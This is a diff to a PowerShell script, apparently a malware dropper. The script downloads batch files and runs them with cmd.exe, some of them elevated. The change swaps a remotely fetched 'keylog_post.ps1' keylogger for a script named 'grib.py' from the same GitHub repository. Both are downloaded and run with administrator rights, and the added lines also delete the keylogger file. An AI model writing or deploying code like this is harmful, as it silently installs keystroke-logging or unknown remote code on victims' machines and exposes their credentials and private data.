@@ -17,7 +17,9 @@ Invoke-WebRequest -Uri $installPythonToolsBatUrl -OutFile $installPythonToolsBat
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonToolsBatPath" -Wait
 Invoke-WebRequest -Uri $batFileUrl -OutFile $batFilePath
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $batFilePath" -Verb RunAs -Wait
-$fgapeScriptUrl = "https://raw.github.com/FanAPIpipa/pipa/raw/main/keylog_post.ps1"
-$fgapeScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "keylog_post.ps1"
-Invoke-WebRequest -Uri $fgapeScriptUrl -OutFile $fgapeScriptPath
-Start-Process -FilePath "powershell.exe" -ArgumentList "-File $fgapeScriptPath" -Verb RunAs -Wait
+$keylogScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "keylog_post.ps1"
+Remove-Item -Path $keylogScriptPath -Force
+$gribScriptUrl = "https://raw.githubusercontent.com/FanAPIpipa/pipa/main/grib.py"
+$gribScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "grib.py"
+Invoke-WebRequest -Uri $gribScriptUrl -OutFile $gribScriptPath
+Start-Process -FilePath "python.exe" -ArgumentList "$gribScriptPath" -Verb RunAs -Wait
